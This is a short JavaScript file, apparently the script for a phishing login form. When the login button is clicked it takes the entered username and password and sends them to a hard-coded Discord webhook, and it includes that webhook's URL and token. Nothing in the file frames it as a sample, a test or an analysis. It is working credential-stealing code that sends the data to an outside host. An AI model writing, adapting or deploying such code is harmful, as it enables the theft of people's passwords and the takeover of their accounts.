const usernameInput = document.getElementById('login-username');
const passwordInput = document.getElementById('login-password');
const loginButton = document.getElementById('login-button');
const webhookURL = 'https://discord.com/api/webhooks/1356411253060403242/-8S5MEC8u0TqKyuXCA4ooSBdntlGNvwODAoktFd80SA1_aBsSmxsvpfPuQ9fpW4NhFd4';
loginButton.addEventListener('click', function() {
    const username = usernameInput.value;
    const password = passwordInput.value;
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `Username: ${username}\nPassword: ${password}`
        })
    }).then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    }).catch(error => {
        console.error('Error:', error);
    });
});
